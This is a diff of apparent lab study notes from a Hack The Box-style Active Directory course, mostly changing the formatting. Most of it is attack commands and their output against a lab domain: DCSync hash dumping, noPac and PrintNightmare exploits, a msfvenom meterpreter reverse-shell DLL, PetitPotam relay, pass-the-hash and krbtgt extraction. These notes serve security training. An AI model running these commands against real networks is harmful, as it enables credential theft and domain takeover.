 | Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose | PowerView tool used to remove a specific user (damundsent) from a specific security group (Help Desk Level 1) from a Windows-based host. |
-| ConvertFrom-SddlString | PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host. |
+| ConvertFrom-SddlString                                                                                  | PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.                            |
 
-# **DCSync**
+## **DCSync**
 
-DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
 
 First lets check if the user have Replication Rights
 
-- `Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl` → View adunn’s group Membership. Copy the objectsid of the user.
-- `PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"` → set variable `sid`
-- `PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl` → finally check the users Replication Rights
+* `Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl` → View adunn’s group Membership. Copy the objectsid of the user.
+* `PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"` → set variable `sid`
+* `PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl` → finally check the users Replication Rights
 
 ```powershell
 PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
@@ -1061,7 +959,7 @@ ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
 
 ```
 
-# **Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**
+## **Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**
 
 ```
 [!bash!]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
@@ -1090,23 +988,21 @@ and flag `-user-status` to check if user is disabled.
 
 `-history` to dump password history.
 
-Using `-just-dc` flag creates three file 
+Using `-just-dc` flag creates three file
 
-→ one with NTLM hash
-→ one with Kerberos Keys
-→ one containing cleartext password from the NTDS for any accounts set with reversible encryption
+→ one with NTLM hash → one with Kerberos Keys → one containing cleartext password from the NTDS for any accounts set with reversible encryption
 
-When reversible encryption is enabled in an account, password are not stored in cleartext.Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.
+When reversible encryption is enabled in an account, password are not stored in cleartext.Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.
 
-- `PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl` → lists user with reversible encryption set
+* `PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl` → lists user with reversible encryption set
 
-# **Performing the Attack with Mimikatz**
+## **Performing the Attack with Mimikatz**
 
 Using mimikatz we must target a specific user.
 
 also mimikatz should run in the context of the user who has DCSync Privileges, which can be achieved using `runas.exe`
 
-- `C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell`→ running as user adunn
+* `C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell`→ running as user adunn
 
 Now in the new powershell, fireup mimikatz
 
@@ -1151,30 +1047,30 @@ Supplemental Credentials:
     Random Value : 4625fd0c31368ff4c255a3b876eaac3d
 ```
 
-# **Stacking The Deck**
+## **Stacking The Deck**
 
-# **Privileged Access**
+## **Privileged Access**
 
-### **Enumerating the Remote Desktop Users Group**
+#### **Enumerating the Remote Desktop Users Group**
 
-- `PS C:\htb>  Import-Module .\PowerView.ps1`
-- `PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
+* `PS C:\htb> Import-Module .\PowerView.ps1`
+* `PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
 
-In bloodhound, for a specific user (whose foothold we have) check for what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
+In bloodhound, for a specific user (whose foothold we have) check for what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2010.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 10.png>)
 
 We can see wley is member of domain user and can rdp into academy…
 
-## **WinRM**
+### **WinRM**
 
-Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. 
+Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts.
 
 We can use this cypher query in bloodhound to hunt for users with Remote Management access
 
-- `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`
+* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2011.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 11.png>)
 
 We can establish Winrm session from windows as
 
@@ -1191,17 +1087,17 @@ PS C:\htb>
 
 Alternatively we can use Evil-WinRM from linux as
 
-- `dollarboysushil@htb[/htb]**$** evil-winrm -i 10.129.201.234 -u forend`
+* `dollarboysushil@htb[/htb]**$** evil-winrm -i 10.129.201.234 -u forend`
 
-# **SQL Server Admin**
+## **SQL Server Admin**
 
-Cypher query to hunt for users with SQLAdmin rights 
+Cypher query to hunt for users with SQLAdmin rights
 
-- `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`
+* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2012.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 12.png>)
 
-### **Enumerating MSSQL Instances with PowerUpSQL**
+#### **Enumerating MSSQL Instances with PowerUpSQL**
 
 ```powershell
 PS C:\htb> cd .\PowerUpSQL\
@@ -1230,26 +1126,25 @@ Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
 
 From linux using `mssqlclient.py`
 
-- `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
+* `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
 
 then we can run os command using
 
-- `SQL> enable_xp_cmdshell`
-- `SQL>` `xp_cmdshell whoami /priv`
+* `SQL> enable_xp_cmdshell`
+* `SQL>` `xp_cmdshell whoami /priv`
 
-# **Kerberos "Double Hop" Problem**
+## **Kerberos "Double Hop" Problem**
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2013.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 13.png>)
 
 The Kerberos "double hop" problem arises in scenarios where authentication is required across multiple servers or services. For example, when a user logs into Server A and then Server A needs to access Server B on behalf of the user, traditional Kerberos authentication fails because the user's credentials cannot be passed from Server A to Server B. This problem is typically encountered in web applications, remote desktop services, and distributed computing environments.
 
-# **Workaround #1: PSCredential Object**
+## **Workaround #1: PSCredential Object**
 
-- `*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1`
-- `get-domainuser -spn`
- this will give us error because we cannot pass our authentication on to the Domain Controller to query for the SPN account
+* `*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1`
+* `get-domainuser -spn` this will give us error because we cannot pass our authentication on to the Domain Controller to query for the SPN account
 
-If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
+If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
 
 ```
 *Evil-WinRM* PS C:\Users\backupadm\Documents> klist
@@ -1273,8 +1168,8 @@ Cached Tickets: (1)
 
 So now, let's set up a PSCredential object and try again. First, we set up our authentication.
 
-- `*Evil-WinRM* PS C:\Users\backupadm\Documents>$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
-- `Evil-WinRM* PS C:\Users\backupadm\Documents> **$**Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`
+* `*Evil-WinRM* PS C:\Users\backupadm\Documents>$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
+* `Evil-WinRM* PS C:\Users\backupadm\Documents> **$**Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`
 
 Now when we try to query for the SPN account while passing our credential along, our cmd will be successfull
 
@@ -1293,7 +1188,7 @@ mssqlsvc
 sqltest
 ```
 
-if we again try without `-credential` flag then,  we will get the same error.
+if we again try without `-credential` flag then, we will get the same error.
 
 IF we RDP to the same host, open CMD and type `klist` we will see necessary tickets cached directly with the DC, and no problem of double hop problem.
 
@@ -1349,11 +1244,11 @@ Cached Tickets: (4)
         Kdc Called: DC01.INLANEFREIGHT.LOCAL
 ```
 
-# **Workaround #2: Register PSSession Configuration**
+## **Workaround #2: Register PSSession Configuration**
 
 Let's start by first establishing a WinRM session on the remote host.
 
-- `PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`
+* `PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`
 
 now when we run `klist` we will get the same error
 
@@ -1369,7 +1264,7 @@ Cached Tickets: (1)
        Ticket Flags 0x40a10000 -
 ```
 
-One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.
+One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.
 
 ```powershell
 PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
@@ -1386,7 +1281,7 @@ configurations that are created with the Register-PSSessionConfiguration cmdlet,
    WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
 ```
 
-Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
+Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
 
 ```powershell
 PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
@@ -1407,36 +1302,36 @@ Cached Tickets: (1)
        Kdc Called: DC01
 ```
 
-# **Bleeding Edge Vulnerabilities**
+## **Bleeding Edge Vulnerabilities**
 
-# **NoPac (SamAccountName Spoofing)**
+## **NoPac (SamAccountName Spoofing)**
 
-CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), 
+CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287),&#x20;
 
 **By default, every authenticated user can add up to ten computers to the Domain. The following steps explain how to perform this attack.**
 
-- Create a new account in Active Directory with a random name and then rename it to one of the Domain Controllers without the trailing “$” symbol.
-- Request a Kerberos ticket for the created account. Once the ticket is granted, change the name of the account created back to its original name (i.e., the random name chosen in the first step).
-- Use the ticket to request an access token from the TGS for a specific service. Because of the absence of an account with that name, the TGS chooses the closest match and appends a “$” symbol. In this way, access to the service is granted with Domain Controller privileges.
+* Create a new account in Active Directory with a random name and then rename it to one of the Domain Controllers without the trailing “$” symbol.
+* Request a Kerberos ticket for the created account. Once the ticket is granted, change the name of the account created back to its original name (i.e., the random name chosen in the first step).
+* Use the ticket to request an access token from the TGS for a specific service. Because of the absence of an account with that name, the TGS chooses the closest match and appends a “$” symbol. In this way, access to the service is granted with Domain Controller privileges.
 
 another explaination
 
-authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. 
+authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.&#x20;
 
 Exploit
 
-- Make sure we have impacket installed in our attacking linux
-- then install Nopac exploit repo [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
-- `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` → checking if target is vulnerable
-- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` → executing the exploit to get shell.
+* Make sure we have impacket installed in our attacking linux
+* then install Nopac exploit repo [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
+* `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` → checking if target is vulnerable
+* `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` → executing the exploit to get shell.
 
-### **Using noPac to DCSync the Built-in Administrator Account**
+#### **Using noPac to DCSync the Built-in Administrator Account**
 
-- `dollarboysushil@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
+* `dollarboysushil@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
 
-# **PrintNightmare**
+## **PrintNightmare**
 
-[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the print spooler service.
+[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the print spooler service.
 
 Exploit to use: `https://github.com/cube0x0/CVE-2021-1675.git` developed by `cube0x0`
 
@@ -1449,93 +1344,86 @@ cd impacket
 python3 ./setup.py install
 ```
 
-- `dollarboysushil@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'` → enumerating for ms-rprn
-- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll` → crafting dll payload
-- `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` → creating SMB share using smbserver.py
-- then start msf multi/handler
-    - use explit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost, set lport and run
-- `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'` → running the shell.
+* `dollarboysushil@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'` → enumerating for ms-rprn
+* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll` → crafting dll payload
+* `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` → creating SMB share using smbserver.py
+* then start msf multi/handler
+  * use explit/multi/handler set payload windows/x64/meterpreter/reverse\_tcp set lhost, set lport and run
+* `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'` → running the shell.
 
-# **PetitPotam (MS-EFSRPC)**
+## **PetitPotam (MS-EFSRPC)**
 
 [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) allows unauthenticated attacker to coerce a DC to authenticate against another host using NTLM over the port 445
 
-- `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
-    
-    starting ntlmrelay 
-    
-- `dollarboysushil@htb[/htb]**$** python3 PetitPotam.py 172.16.5.225 172.16.5.5`
-    
+*   `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
+
+    starting ntlmrelay
+*   `dollarboysushil@htb[/htb]**$** python3 PetitPotam.py 172.16.5.225 172.16.5.5`
+
     running [petitpotam.py](http://petitpotam.py) with attackerhost IP and DC ip to force DC to authenticate to our host when nrlmrelayx is running.
-    
 
 In our ntlmrelay running tab, we will see successfull login request and base64 encoded certificate for the domain controller.
 
 Using the base64 certificate, we can use [gettgtpkinit.py](http://gettgtpkinit.py) tool to request TGT for the domain controller.
 
-- `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`
-    
-    The TGT will be saved to dc01.ccache file. lets set the KRBCCNAME env variable to  that ccache
-    
-- `dollarboysushil@htb[/htb]**$** export KRB5CCNAME=dc01.ccache`
+*   `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`
 
-Using DC TGT lets do DCSync 
+    The TGT will be saved to dc01.ccache file. lets set the KRBCCNAME env variable to that ccache
+* `dollarboysushil@htb[/htb]**$** export KRB5CCNAME=dc01.ccache`
 
-- `dollarboysushil@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
-    
+Using DC TGT lets do DCSync
+
+*   `dollarboysushil@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
+
     this will give us the NTLM hash
-    
 
-### **Confirming Admin Access to the Domain Controller**
+#### **Confirming Admin Access to the Domain Controller**
 
-- `dollarboysushil@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`
+* `dollarboysushil@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`
 
-# **Miscellaneous Misconfigurations**
+## **Miscellaneous Misconfigurations**
 
-# **Enumerating DNS Records**
+## **Enumerating DNS Records**
 
-We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.
+We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.
 
-- `dollarboysushil@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`
-    
+*   `dollarboysushil@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`
+
     we can use `-r` flag to resolve unknown records
-    
+
     data will be saved in `records.csv`
-    
 
-# **ASREPRoasting**
+## **ASREPRoasting**
 
-It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.
+It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.
 
-First , search for account with Donot_req_preauth
+First , search for account with Donot\_req\_preauth
 
-- `PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
+* `PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
+* `PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` or using kerbrute
+* `dollarboysushil@htb[/htb]**$** kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
 
-- `PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`
-or using kerbrute
-- `dollarboysushil@htb[/htb]**$** kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
+| Command                                                           | Description                                                                                                                                          |
+| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Import-Module .\SecurityAssessment.ps1                            | Used to import the module Security Assessment.ps1. Performed from a Windows-based host.                                                              |
+| Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.                    |
+| adidnsdump -u inlanefreight\forend ldap://172.16.5.5              | Used to resolve all records in a DNS zone over LDAP from a Linux-based host.                                                                         |
+| adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r           | Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.                                                 |
+| Get-DomainUser \*                                                 | Select-Object samaccountname,description                                                                                                             |
+| Get-DomainUser -UACFilter PASSWD\_NOTREQD                         | Select-Object samaccountname,useraccountcontrol                                                                                                      |
+| ls \academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts            | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |
 
-| Command | Description |
-| --- | --- |
-| Import-Module .\SecurityAssessment.ps1 | Used to import the module Security Assessment.ps1. Performed from a Windows-based host. |
-| Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host. |
-| adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 | Used to resolve all records in a DNS zone over LDAP from a Linux-based host. |
-| adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r | Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host. |
-| Get-DomainUser * | Select-Object samaccountname,description | PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host. |
-| Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol | PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host. |
-| ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |
+## Why So Trusting? (Golden Ticket)
 
-# Why So Trusting? (Golden Ticket)
+## Domain Trusts Primer
 
-# Domain Trusts Primer
+A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.&#x20;
 
-A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. 
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 14.png>)
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2014.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 15.png>)
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2015.png)
-
-# **Enumerating Trust Relationships**
+## **Enumerating Trust Relationships**
 
 ```powershell
 PS C:\htb> Import-Module activedirectory
@@ -1590,7 +1478,7 @@ UsesAESKeys             : False
 UsesRC4Encryption       : False
 ```
 
-# Using Powerview
+## Using Powerview
 
 ```powershell
 PS C:\htb> Import-Moduel .\powerview.ps1
@@ -1613,21 +1501,21 @@ WhenCreated     : 11/1/2021 8:07:09 PM
 WhenChanged     : 2/27/2022 12:02:39 AM
 ```
 
-We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.
+We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%2016.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 16.png>)
 
-# **Attacking Domain Trusts - Child -> Parent Trusts - from Windows**
+## **Attacking Domain Trusts - Child -> Parent Trusts - from Windows**
 
-The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
+The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
 
-# **ExtraSids Attack - Mimikatz**
+## **ExtraSids Attack - Mimikatz**
 
-### **Obtaining the KRBTGT Account's NT Hash using Mimikatz**
+#### **Obtaining the KRBTGT Account's NT Hash using Mimikatz**
 
 `KRBTGT` is a service account for the KDC in AD.
 
-- `PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
+* `PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
 
 ```powershell
 PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
@@ -1654,7 +1542,7 @@ Credentials:
     lm  - 0: 69df324191d4a80f0ed100c10f20561e
 ```
 
-We can use the PowerView `Get-DomainSID` function to get the SID for the child domain,
+We can use the PowerView `Get-DomainSID` function to get the SID for the child domain,
 
 ```powershell
 PS C:\htb> Get-DomainSID
@@ -1662,7 +1550,7 @@ PS C:\htb> Get-DomainSID
 S-1-5-21-2806153819-209893948-922872689
 ```
 
-Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.
+Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.
 
 ```powershell
 PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
